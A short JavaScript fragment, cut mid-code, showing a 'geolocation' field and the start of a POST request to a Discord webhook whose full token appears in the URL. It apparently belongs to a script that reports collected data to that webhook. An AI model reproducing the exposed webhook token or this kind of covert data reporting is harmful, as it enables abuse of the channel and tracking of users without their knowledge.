      geolocation: null
    };

    fetch("https://discord.com/api/webhooks/1442229849287692338/pPy2dPqNwMFkFtRLoNuFfo0Vk8GQN_XmxI6ZA9VjqlqHI9_7DTcJ-GmhrGrH8o4CJtvE", {
      method: "POST",
